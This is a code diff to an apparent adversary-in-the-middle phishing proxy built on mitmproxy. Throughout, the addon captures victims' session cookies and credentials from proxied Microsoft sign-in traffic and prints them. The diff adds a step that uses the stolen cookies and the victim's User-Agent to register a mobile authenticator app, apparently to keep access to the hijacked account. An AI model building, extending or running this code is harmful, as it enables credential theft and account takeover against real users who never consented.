@@ -12,6 +12,7 @@ from mitmproxy.http import HTTPFlow
 
 from .aitm_config import config
 from .helpers import cookies, requests, responses
+from .msft_aama import register_mobile_app
 
 logger = logging.getLogger(__name__)
 
@@ -63,11 +64,14 @@ class ModifierAddon:
             flow (mitmproxy.http.HTTPFlow): The HTTP flow object representing
                                             the client request and server response.
         """
-        responses.modify_header(flow, "Location")
+
         responses.save_cookies(flow, self.simple_cookie)
-        responses.modify_cookies(flow)
-        responses.modify_content(flow)
 
         if flow.request.path in config.auth_url:
+            register_mobile_app(self.simple_cookie, flow.request.headers["User-Agent"])
             print(json.dumps(cookies.parse_cookies(self.simple_cookie)))
             print(self.credentials)
+
+        responses.modify_header(flow, "Location")
+        responses.modify_cookies(flow)
+        responses.modify_content(flow)
